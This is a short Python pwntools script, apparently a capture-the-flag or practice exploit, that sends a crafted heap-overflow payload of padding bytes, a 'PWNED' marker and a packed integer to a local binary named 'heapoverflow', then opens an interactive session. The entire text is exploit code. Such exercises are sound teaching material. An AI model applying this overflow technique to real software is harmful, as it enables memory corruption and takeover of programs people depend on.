#!/usr/bin/env python3
from pwn import *

p = process('./heapoverflow')

raw_input('>')

payload  = b'A' * 0x28
payload += b'B' * 0x8
payload += b'PWNED\0\0\0'
payload += p64(1)
p.sendafter(b'msg: ', payload)


p.interactive()

